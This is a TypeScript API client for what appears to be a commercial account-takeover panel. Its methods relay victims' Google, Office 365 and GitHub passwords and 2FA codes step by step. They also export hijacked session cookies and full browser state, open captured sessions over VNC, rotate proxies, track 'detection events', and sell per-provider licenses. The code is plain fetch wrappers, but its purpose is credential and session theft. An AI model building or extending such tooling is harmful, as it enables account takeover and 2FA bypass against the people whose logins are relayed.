/**
 * API Client
 * Centralized API communication layer with typed methods
 */

import {
  LoginResponse,
  InitiateLoginRequest,
  SubmitPasswordRequest,
  LogoutResponse,
  Session,
  SessionListResponse,
  SessionResponse,
  HealthResponse,
  Submit2FARequest,
  Switch2FARequest,
  AuthResponse,
  RegisterRequest,
  LoginRequest,
  ApiKey,
  GenerateApiKeyRequest,
  GenerateApiKeyResponse,
  ApiKeyListResponse,
  ProxyValidateResponse,
  ProxyPoolResponse,
  ProxyConfig,
  ProxyPoolStats,
  ProxyProviderConfig,
  ProxyProviderType,
  SaveProviderRequest,
  ProxyProviderListResponse,
  ProxyProviderSaveResponse,
  ProxyProviderTestResponse,
  NotificationSettings,
  SaveNotificationRequest,
  VncEndpoints,
  ProvisioningData,
  ProviderLicense,
  ApiResponse,
  CheckoutResponseData,
  VerifyPaymentResponse,
  Transaction,
  TransactionListResponse,
  MarketplaceProvider,
  PaginationParams,
  PaginatedResponse,
} from "../types";

// ============================================================================
// Configuration
// ============================================================================

const getApiBaseUrl = () => {
  return localStorage.getItem("prx_api_url") || import.meta.env.VITE_API_URL || "http://localhost:8000";
};

// ============================================================================
// Base Fetch Utility - DRY principle
// ============================================================================

interface FetchOptions {
  method?: "GET" | "POST" | "PUT" | "DELETE" | "PATCH";
  body?: unknown;
  skipAuth?: boolean;
}

function getAuthToken(): string | null {
  if (typeof window === "undefined") return null;
  return localStorage.getItem("prx_token");
}

async function apiFetch<T>(
  endpoint: string,
  options: FetchOptions = {},
): Promise<T> {
  const { method = "GET", body, skipAuth = false } = options;

  const headers: Record<string, string> = {
    "Content-Type": "application/json",
  };

  // Add auth token if available and not skipped
  if (!skipAuth) {
    const token = getAuthToken();
    if (token) {
      headers["Authorization"] = `Bearer ${token}`;
    }
  }

  const response = await fetch(`${getApiBaseUrl()}${endpoint}`, {
    method,
    headers,
    body: body ? JSON.stringify(body) : undefined,
  });

  if (!response.ok) {
    const errorData = await response.json().catch(() => ({}));

    // Handle unauthorized errors (expired tokens)
    if (
      response.status === 401 &&
      !endpoint.includes("/api/auth/login") &&
      typeof window !== "undefined"
    ) {
      localStorage.removeItem("prx_token");
      localStorage.removeItem("auth_user");
      window.location.reload(); // Reload to trigger AppContent authentication check
    }

    throw new ApiError(
      errorData.message || errorData.error || `HTTP ${response.status}`,
      response.status,
      errorData,
    );
  }

  return response.json();
}

// ============================================================================
// Custom Error Class
// ============================================================================

export class ApiError extends Error {
  constructor(
    public message: string,
    public statusCode: number,
    public data?: any,
  ) {
    super(message);
    this.name = "ApiError";
  }
}

// ============================================================================
// API Methods - Separation of Concerns
// ============================================================================

/**
 * Google Authentication API
 */
export const googleApi = {
  /**
   * Step 1: Initiate login with email
   */
  initiateLogin: async (data: InitiateLoginRequest): Promise<LoginResponse> => {
    return apiFetch<LoginResponse>("/api/google/login/initiate", {
      method: "POST",
      body: data,
    });
  },

  /**
   * Step 2: Submit password to complete login
   */
  submitPassword: async (
    data: SubmitPasswordRequest,
  ): Promise<LoginResponse> => {
    return apiFetch<LoginResponse>("/api/google/login/password", {
      method: "POST",
      body: data,
    });
  },

  /**
   * Submit 2FA code or trigger push verification
   */
  submit2FA: async (data: Submit2FARequest): Promise<LoginResponse> => {
    return apiFetch<LoginResponse>("/api/google/2fa", {
      method: "POST",
      body: data,
    });
  },
};

/**
 * Office 365 Authentication API
 */
export const officeApi = {
  /**
   * Step 1: Initiate login with email
   */
  initiateLogin: async (data: InitiateLoginRequest): Promise<LoginResponse> => {
    return apiFetch<LoginResponse>("/api/office/login/initiate", {
      method: "POST",
      body: data,
    });
  },

  /**
   * Step 2: Submit password to complete login
   */
  submitPassword: async (
    data: SubmitPasswordRequest,
  ): Promise<LoginResponse> => {
    return apiFetch<LoginResponse>("/api/office/login/password", {
      method: "POST",
      body: data,
    });
  },

  /**
   * Submit 2FA code or trigger push verification
   */
  submit2FA: async (data: Submit2FARequest): Promise<LoginResponse> => {
    return apiFetch<LoginResponse>("/api/office/2fa", {
      method: "POST",
      body: data,
    });
  },
};

/**
 * GitHub Authentication API
 */
export const githubApi = {
  /**
   * Login with username and password (single step)
   */
  login: async (data: {
    username: string;
    password: string;
    fingerprint?: any;
  }): Promise<LoginResponse> => {
    return apiFetch<LoginResponse>("/api/github/login", {
      method: "POST",
      body: data,
    });
  },

  /**
   * Submit 2FA code
   */
  submit2FA: async (data: Submit2FARequest): Promise<LoginResponse> => {
    return apiFetch<LoginResponse>("/api/github/2fa", {
      method: "POST",
      body: data,
    });
  },

  /**
   * Switch 2FA method
   */
  switch2FA: async (data: Switch2FARequest): Promise<LoginResponse> => {
    return apiFetch<LoginResponse>("/api/github/2fa/switch", {
      method: "POST",
      body: data,
    });
  },
};

/**
 * Unified Session Management API
 */
export const sessionApi = {
  /**
   * Get all sessions from all providers
   */
  list: async (): Promise<Session[]> => {
    const response = await apiFetch<SessionListResponse>("/api/sessions");
    return response.data || [];
  },

  /**
   * Get a single session by ID
   */
  get: async (sessionId: string): Promise<Session | null> => {
    try {
      const response = await apiFetch<SessionResponse>(
        `/api/sessions/${sessionId}`,
      );
      return response.data || null;
    } catch (error) {
      if (error instanceof ApiError && error.statusCode === 404) {
        return null;
      }
      throw error;
    }
  },

  /**
   * Verify session status
   */
  verify: async (
    sessionId: string,
  ): Promise<{ success: boolean; status: string; message: string }> => {
    const response = await apiFetch<{
      success: boolean;
      data: { success: boolean; status: string; message: string };
    }>(`/api/sessions/${sessionId}/verify`, {
      method: "POST",
    });
    return response.data;
  },

  /**
   * Logout and cleanup a session
   */
  logout: async (sessionId: string): Promise<LogoutResponse> => {
    return apiFetch<LogoutResponse>(`/api/sessions/${sessionId}/logout`, {
      method: "POST",
    });
  },

  /**
   * Delete multiple sessions
   */
  deleteMultiple: async (sessionIds: string[]): Promise<{ success: boolean; message: string }> => {
    return apiFetch<{ success: boolean; message: string }>("/api/sessions", {
      method: "DELETE",
      body: { sessionIds },
    });
  },

  /**
   * Open session in a headed browser
   */
  open: async (
    sessionId: string,
  ): Promise<{ success: boolean; message: string }> => {
    return apiFetch(`/api/sessions/${sessionId}/open`, {
      method: "POST",
    });
  },

  /**
   * Export session cookies in Chrome-compatible format
   */
  exportCookies: async (
    sessionId: string,
  ): Promise<{ cookies: any[]; email: string; provider: string }> => {
    const response = await apiFetch<{
      success: boolean;
      data: { cookies: any[]; email: string; provider: string };
    }>(`/api/sessions/${sessionId}/export-cookies`);
    return response.data;
  },

  /**
   * Export full browser state (cookies, localStorage, sessionStorage)
   */
  exportBrowserState: async (
    sessionId: string,
  ): Promise<{ cookies: any[]; origins: any[] }> => {
    const response = await apiFetch<{
      success: boolean;
      data: { cookies: any[]; origins: any[] };
    }>(`/api/sessions/${sessionId}/export-state`);
    return response.data;
  },

  /**
   * Get VNC endpoints for a session with an active headed browser
   */
  getVnc: async (sessionId: string): Promise<VncEndpoints> => {
    const response = await apiFetch<{
      success: boolean;
      data: VncEndpoints;
    }>(`/api/sessions/${sessionId}/vnc`);
    return response.data;
  },
};

/**
 * Health API
 */
export const healthApi = {
  /**
   * Check API health
   */
  check: async (): Promise<HealthResponse> => {
    return apiFetch<HealthResponse>("/health");
  },
};

/**
 * User Authentication API
 */
export const authApi = {
  /**
   * Login with email and password
   */
  login: async (data: LoginRequest): Promise<AuthResponse> => {
    return apiFetch<AuthResponse>("/api/auth/login", {
      method: "POST",
      body: data,
    });
  },

  /**
   * Register a new user and tenant
   */
  register: async (data: RegisterRequest): Promise<AuthResponse> => {
    return apiFetch<AuthResponse>("/api/auth/register", {
      method: "POST",
      body: data,
    });
  },

  /**
   * Change password (requires current password)
   */
  changePassword: async (data: {
    currentPassword: string;
    newPassword: string;
  }): Promise<{ success: boolean; message?: string }> => {
    return apiFetch<{ success: boolean; message?: string }>(
      "/api/auth/change-password",
      {
        method: "POST",
        body: data,
      },
    );
  },
};

/**
 * API Key Management API
 */
export const apiKeyApi = {
  /**
   * Generate a new API key
   */
  generate: async (
    data: GenerateApiKeyRequest,
  ): Promise<GenerateApiKeyResponse> => {
    return apiFetch<GenerateApiKeyResponse>("/api/keys", {
      method: "POST",
      body: data,
    });
  },

  /**
   * List all API keys for the tenant
   */
  list: async (): Promise<ApiKey[]> => {
    const response = await apiFetch<ApiKeyListResponse>("/api/keys");
    return response.data || [];
  },

  /**
   * Revoke an API key
   */
  revoke: async (
    keyId: string,
  ): Promise<{ success: boolean; message?: string }> => {
    return apiFetch("/api/keys/" + keyId, {
      method: "DELETE",
    });
  },
};

/**
 * Proxy Management API
 */
export const proxyApi = {
  /**
   * Validate a proxy configuration
   */
  validate: async (data: ProxyConfig): Promise<ProxyValidateResponse> => {
    return apiFetch<ProxyValidateResponse>("/api/proxy/validate", {
      method: "POST",
      body: data,
    });
  },

  /**
   * Add a proxy to the pool
   */
  add: async (
    data: ProxyConfig & { validate?: boolean },
  ): Promise<ProxyPoolResponse> => {
    return apiFetch<ProxyPoolResponse>("/api/proxy/pool", {
      method: "POST",
      body: data,
    });
  },

  /**
   * Remove a proxy from the pool
   */
  remove: async (server: string): Promise<ProxyPoolResponse> => {
    return apiFetch<ProxyPoolResponse>("/api/proxy/pool", {
      method: "DELETE",
      body: { server },
    });
  },

  /**
   * Get proxy pool statistics and list
   */
  getStats: async (): Promise<ProxyPoolStats> => {
    const response = await apiFetch<ProxyPoolResponse>("/api/proxy/pool/stats");
    return response.data || { total: 0, healthy: 0, unhealthy: 0, proxies: [] };
  },
};

/**
 * Proxy Provider Settings API
 */
export const proxyProviderApi = {
  /**
   * List all configured providers
   */
  list: async (): Promise<ProxyProviderConfig[]> => {
    const response = await apiFetch<ProxyProviderListResponse>(
      "/api/settings/proxy-providers",
    );
    return response.data || [];
  },

  /**
   * Save (create or update) a provider configuration
   */
  save: async (
    data: SaveProviderRequest,
  ): Promise<ProxyProviderSaveResponse> => {
    return apiFetch<ProxyProviderSaveResponse>(
      "/api/settings/proxy-providers",
      {
        method: "POST",
        body: data,
      },
    );
  },

  /**
   * Remove a provider configuration
   */
  remove: async (
    provider: ProxyProviderType,
  ): Promise<{ success: boolean; message?: string }> => {
    return apiFetch(`/api/settings/proxy-providers/${provider}`, {
      method: "DELETE",
    });
  },

  /**
   * Toggle provider enabled status
   */
  toggle: async (
    provider: ProxyProviderType,
    enabled: boolean,
  ): Promise<{ success: boolean; message?: string }> => {
    return apiFetch(`/api/settings/proxy-providers/${provider}/toggle`, {
      method: "PATCH",
      body: { enabled },
    });
  },

  /**
   * Test provider credentials
   */
  test: async (
    provider: ProxyProviderType,
  ): Promise<ProxyProviderTestResponse> => {
    return apiFetch<ProxyProviderTestResponse>(
      `/api/settings/proxy-providers/${provider}/test`,
      {
        method: "POST",
      },
    );
  },
};

/**
 * Notification Settings API
 */
export const notificationApi = {
  /**
   * Get notification settings
   */
  getSettings: async (): Promise<NotificationSettings> => {
    return apiFetch<NotificationSettings>(
      "/api/settings/notifications/settings",
    );
  },

  /**
   * Save notification settings
   */
  saveSettings: async (
    data: SaveNotificationRequest,
  ): Promise<{ message: string }> => {
    return apiFetch<{ message: string }>(
      "/api/settings/notifications/settings",
      {
        method: "POST",
        body: data,
      },
    );
  },

  /**
   * Test notification settings
   */
  testSettings: async (
    data: SaveNotificationRequest,
  ): Promise<{ message: string }> => {
    return apiFetch<{ message: string }>("/api/settings/notifications/test", {
      method: "POST",
      body: data,
    });
  },
};
/**
 * Billing & Subscription API
 */
export const billingApi = {
  /**
   * Purchase or renew a provider subscription
   */
  checkout: async (data: {
    provider: string;
    durationMonths?: number;
    paymentMethod?: string;
  }): Promise<ApiResponse<CheckoutResponseData>> => {
    return apiFetch<ApiResponse<CheckoutResponseData>>(
      "/api/billing/checkout",
      {
        method: "POST",
        body: data,
      },
    );
  },

  getTransaction: async (
    id: string,
  ): Promise<
    ApiResponse<
      CheckoutResponseData & {
        status: string;
        amount: number;
        provider: string;
      }
    >
  > => {
    return apiFetch<
      ApiResponse<
        CheckoutResponseData & {
          status: string;
          amount: number;
          provider: string;
        }
      >
    >(`/api/billing/transaction/${id}`);
  },

  /**
   * Manually verify a payment status
   */
  verifyPayment: async (
    transactionId: string,
  ): Promise<VerifyPaymentResponse> => {
    return apiFetch<VerifyPaymentResponse>(
      `/api/billing/verify/${transactionId}`,
      { method: "POST" },
    );
  },

  /**
   * List all provider licenses with full details
   */
  listLicenses: async (): Promise<ProviderLicense[]> => {
    const response = await apiFetch<{
      success: boolean;
      data: { licenses: ProviderLicense[] };
    }>("/api/billing/licenses");
    return response.data?.licenses || [];
  },

  /**
   * Get provisioning data for a specific provider license
   */
  getProvisioningData: async (provider: string): Promise<ProvisioningData> => {
    const response = await apiFetch<{
      success: boolean;
      data: ProvisioningData;
    }>(`/api/billing/provisioning/${provider}`);
    return response.data;
  },

  /**
   * List all payment transactions for the tenant
   */
  listTransactions: async (): Promise<Transaction[]> => {
    const response = await apiFetch<TransactionListResponse>(
      "/api/billing/transactions",
    );
    return response.data || [];
  },

  /**
   * List all marketplace provider catalog entries
   */
  listMarketplaceProviders: async (): Promise<MarketplaceProvider[]> => {
    const response = await apiFetch<ApiResponse<MarketplaceProvider[]>>(
      "/api/billing/marketplace-providers",
    );
    return response.data || [];
  },
};

/**
 * Admin Management API
 */
export const adminApi = {
  /**
   * Get system-wide statistics
   */
  getStats: async (): Promise<any> => {
    const response = await apiFetch<ApiResponse<any>>("/api/admin/stats");
    return response.data;
  },

  /**
   * Users CRUD
   */
  listUsers: async (params?: PaginationParams): Promise<PaginatedResponse<any>> => {
    const searchParams = new URLSearchParams();
    if (params?.page) searchParams.append("page", params.page.toString());
    if (params?.limit) searchParams.append("limit", params.limit.toString());
    if (params?.search) searchParams.append("search", params.search);

    const response = await apiFetch<ApiResponse<any[]>>(`/api/admin/users?${searchParams.toString()}`);
    return {
      data: response.data || [],
      total: (response as any).meta?.total || 0,
      page: (response as any).meta?.page || 1,
      limit: (response as any).meta?.limit || 10,
    };
  },
  createUser: async (data: any): Promise<any> => {
    return apiFetch("/api/admin/users", { method: "POST", body: data });
  },
  updateUser: async (userId: string, data: any): Promise<any> => {
    return apiFetch(`/api/admin/users/${userId}`, {
      method: "PUT",
      body: data,
    });
  },
  deleteUser: async (userId: string): Promise<any> => {
    return apiFetch(`/api/admin/users/${userId}`, { method: "DELETE" });
  },

  /**
   * Tenants CRUD
   */
  listTenants: async (params?: PaginationParams): Promise<PaginatedResponse<any>> => {
    const searchParams = new URLSearchParams();
    if (params?.page) searchParams.append("page", params.page.toString());
    if (params?.limit) searchParams.append("limit", params.limit.toString());
    if (params?.search) searchParams.append("search", params.search);

    const response = await apiFetch<ApiResponse<any[]>>(`/api/admin/tenants?${searchParams.toString()}`);
    return {
      data: response.data || [],
      total: (response as any).meta?.total || 0,
      page: (response as any).meta?.page || 1,
      limit: (response as any).meta?.limit || 10,
    };
  },
  createTenant: async (data: any): Promise<any> => {
    return apiFetch("/api/admin/tenants", { method: "POST", body: data });
  },
  updateTenant: async (tenantId: string, data: any): Promise<any> => {
    return apiFetch(`/api/admin/tenants/${tenantId}`, {
      method: "PUT",
      body: data,
    });
  },
  deleteTenant: async (tenantId: string): Promise<any> => {
    return apiFetch(`/api/admin/tenants/${tenantId}`, { method: "DELETE" });
  },

  /**
   * Sessions
   */
  listSessions: async (params?: PaginationParams): Promise<PaginatedResponse<any>> => {
    const searchParams = new URLSearchParams();
    if (params?.page) searchParams.append("page", params.page.toString());
    if (params?.limit) searchParams.append("limit", params.limit.toString());
    if (params?.search) searchParams.append("search", params.search);

    const response = await apiFetch<ApiResponse<any[]>>(`/api/admin/sessions?${searchParams.toString()}`);
    return {
      data: response.data || [],
      total: (response as any).meta?.total || 0,
      page: (response as any).meta?.page || 1,
      limit: (response as any).meta?.limit || 10,
    };
  },
  deleteSession: async (sessionId: string): Promise<any> => {
    return apiFetch(`/api/admin/sessions/${sessionId}`, { method: "DELETE" });
  },

  /**
   * Proxies
   */
  listProxies: async (params?: PaginationParams): Promise<PaginatedResponse<any>> => {
    const searchParams = new URLSearchParams();
    if (params?.page) searchParams.append("page", params.page.toString());
    if (params?.limit) searchParams.append("limit", params.limit.toString());
    if (params?.search) searchParams.append("search", params.search);

    const response = await apiFetch<ApiResponse<any[]>>(`/api/admin/proxies?${searchParams.toString()}`);
    return {
      data: response.data || [],
      total: (response as any).meta?.total || 0,
      page: (response as any).meta?.page || 1,
      limit: (response as any).meta?.limit || 10,
    };
  },
  deleteProxy: async (proxyId: string): Promise<any> => {
    return apiFetch(`/api/admin/proxies/${proxyId}`, { method: "DELETE" });
  },

  /**
   * Transactions
   */
  listTransactions: async (params?: PaginationParams): Promise<PaginatedResponse<any>> => {
    const searchParams = new URLSearchParams();
    if (params?.page) searchParams.append("page", params.page.toString());
    if (params?.limit) searchParams.append("limit", params.limit.toString());
    if (params?.search) searchParams.append("search", params.search);

    const response = await apiFetch<ApiResponse<any[]>>(`/api/admin/transactions?${searchParams.toString()}`);
    return {
      data: response.data || [],
      total: (response as any).meta?.total || 0,
      page: (response as any).meta?.page || 1,
      limit: (response as any).meta?.limit || 10,
    };
  },
  updateTransaction: async (id: string, data: any) => {
    return apiFetch(`/api/admin/transactions/${id}`, {
      method: "PUT",
      body: data,
    });
  },

  /**
   * Licenses
   */
  listLicenses: async (params?: PaginationParams): Promise<PaginatedResponse<any>> => {
    const searchParams = new URLSearchParams();
    if (params?.page) searchParams.append("page", params.page.toString());
    if (params?.limit) searchParams.append("limit", params.limit.toString());
    if (params?.search) searchParams.append("search", params.search);

    const response = await apiFetch<ApiResponse<any[]>>(`/api/admin/licenses?${searchParams.toString()}`);
    return {
      data: response.data || [],
      total: (response as any).meta?.total || 0,
      page: (response as any).meta?.page || 1,
      limit: (response as any).meta?.limit || 10,
    };
  },
  createLicense: async (data: any) => {
    return apiFetch("/api/admin/licenses", { method: "POST", body: data });
  },
  updateLicense: async (id: string, data: any) => {
    return apiFetch(`/api/admin/licenses/${id}`, {
      method: "PUT",
      body: data,
    });
  },
  deleteLicense: async (id: string) => {
    return apiFetch(`/api/admin/licenses/${id}`, { method: "DELETE" });
  },

  /**
   * Telemetry
   */
  listDetectionEvents: async (params?: {
    page?: number;
    limit?: number;
    type?: string;
    provider?: string;
    severity?: string;
  }): Promise<PaginatedResponse<any>> => {
    const searchParams = new URLSearchParams();
    if (params?.page) searchParams.append("page", params.page.toString());
    if (params?.limit) searchParams.append("limit", params.limit.toString());
    if (params?.type) searchParams.append("type", params.type);
    if (params?.provider) searchParams.append("provider", params.provider);
    if (params?.severity) searchParams.append("severity", params.severity);

    const response = await apiFetch<ApiResponse<any[]>>(`/api/admin/telemetry/events?${searchParams.toString()}`);
    return {
      data: response.data || [],
      total: (response as any).meta?.total || 0,
      page: (response as any).meta?.page || 1,
      limit: (response as any).meta?.limit || 50,
    };
  },
  getDetectionStats: async (days: number = 7): Promise<any> => {
    const response = await apiFetch<ApiResponse<any>>(`/api/admin/telemetry/stats?days=${days}`);
    return response.data;
  },
};

